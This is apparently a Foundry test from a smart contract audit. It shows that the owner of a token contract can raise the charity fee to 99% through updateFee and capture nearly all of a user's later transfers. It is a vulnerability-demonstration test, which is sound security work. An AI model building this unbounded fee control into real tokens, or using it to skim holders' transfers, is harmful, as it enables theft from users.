// SPDX-License-Identifier: MIT
pragma solidity 0.8.2;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CoinToken.sol";

contract CoinTokenFeeManipulationTest is Test {
    CoinToken public token;
    address owner = address(0x1);
    address user1 = address(0x2);
    address charityWallet = address(0x3);
    address user2 = address(0x4);
    
    function setUp() public {
        vm.startPrank(owner);
        token = new CoinToken(
            "Vulnerable Token", 
            "VULN", 
            18, 
            100000,    // Total supply
            0,         // Initial txFee (0%)
            0,         // Initial burnFee (0%)
            0,         // Initial charityFee (0%)
            charityWallet,
            owner, 
            address(0) 
        );
        
        // Distribute tokens
        token.transfer(user1, 1000 * 10**token.decimals());
        vm.stopPrank();
    }

    function testFeeManipulation() public {
        uint256 decimals = token.decimals();
        uint256 oneToken = 10 ** decimals;
        uint256 initialUserBalance = 1000 * oneToken;
        uint256 transferAmount = 100 * oneToken;
        
        // Verify initial state
        assertEq(token.balanceOf(user1), initialUserBalance, "User1 initial balance mismatch");
        assertEq(token.balanceOf(charityWallet), 0, "Charity initial balance should be zero");
        assertEq(token.balanceOf(user2), 0, "User2 initial balance should be zero");
        
        console.log("--- BEFORE-Trigger Transfer ---");
        uint256 charityBefore = token.balanceOf(charityWallet);
        uint256 user2Before = token.balanceOf(user2);
        
        // First transfer with 0% fees
        vm.prank(user1);
        token.transfer(user2, transferAmount);
        
        uint256 charityAfter1 = token.balanceOf(charityWallet);
        uint256 user2After1 = token.balanceOf(user2);
        uint256 charityNet1 = charityAfter1 - charityBefore;
        uint256 user2Net1 = user2After1 - user2Before;
        
        console.log("Initial transfer results:");
        console.log("  Charity wallet net: %s", charityNet1);
        console.log("  User2 net: %s", user2Net1);
        
        console.log("--- Trigger Fee Manipulation ---");
        // Owner sets only charity fee to 99% (tax=0, burn=0)
        vm.prank(owner);
        token.updateFee(0, 0, 99);
        
        console.log("--- AFTER-Trigger Transfer ---");
        charityBefore = charityAfter1;  // Reset to post-first transfer state
        user2Before = user2After1;
        
        // Second transfer with 99% fee
        vm.prank(user1);
        token.transfer(user2, transferAmount);
        
        uint256 charityAfter2 = token.balanceOf(charityWallet);
        uint256 user2After2 = token.balanceOf(user2);
        uint256 charityNet2 = charityAfter2 - charityBefore;
        uint256 user2Net2 = user2After2 - user2Before;
        
        console.log("Post-attack transfer results:");
        console.log("  Charity wallet net: %s", charityNet2);
        console.log("  User2 net: %s", user2Net2);
        
        // Fee exploitation checks
        bool excessiveFee = charityNet2 == 99 * oneToken;
        bool minimalToRecipient = user2Net2 == 1 * oneToken;
        bool vulnerabilityExists = excessiveFee && minimalToRecipient;
        
        console.log("--- Differential Verification ---");
        console.log("Fee manipulation check:");
        console.log("  Charity net increase 99 tokens: %s", excessiveFee ? "YES" : "NO");
        console.log("  Recipient only received 1 token: %s", minimalToRecipient ? "YES" : "NO");
        console.log("Verdict: %s", vulnerabilityExists ? "Fee manipulation SUCCESSFUL" : "Fee manipulation FAILED");
        
        // Final vulnerability determination
        if(vulnerabilityExists) {
            console.log("Vulnerability Exists: Fee parameters can be abused to capture 99% of transfers");
        } else {
            console.log("Vulnerability not Exist: Fee parameters within safe boundaries");
        }
    }
}